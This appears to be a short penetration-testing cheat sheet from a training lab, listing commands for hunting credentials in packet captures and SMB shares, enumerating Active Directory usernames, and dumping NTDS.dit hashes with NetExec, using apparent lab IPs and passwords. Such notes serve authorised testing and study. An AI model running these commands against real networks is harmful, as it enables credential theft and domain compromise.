# Credential Hunting in Network Traffic & Shares

## Wireshark Credential Filters

| Filter | Purpose |
|---|---|
| `http` | All HTTP traffic |
| `http.request.method == "POST"` | POST requests (often contain credentials) |
| `http contains "passw"` | Packets containing password strings |
| `tcp.port == 80` | Port 80 traffic |
| `ip.addr == X.X.X.X` | Filter by specific IP |

## Pcredz (PCAP Credential Extraction)

```
./Pcredz -f demo.pcapng -t -v
```

Extracts: FTP/POP/SMTP/IMAP/SNMP credentials, HTTP NTLM/Basic auth, NTLMv1/v2 hashes, Kerberos AS-REQ hashes, credit card numbers.

## Snaffler (Windows, Domain-Joined)

* Automatically finds interesting files on accessible shares

```
Snaffler.exe -s
```

## PowerHuntShares

```powershell
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

## MANSPIDER (Linux, via Docker)

```
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

## NetExec Spider Shares

```
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```

---

## AD Username Enumeration

### Kerbrute

```
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

### Username Anarchy (Name Permutation)

```
./username-anarchy -i /home/ltnbob/names.txt
```

### NTDS.dit Dump (NetExec One-Liner)

```
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
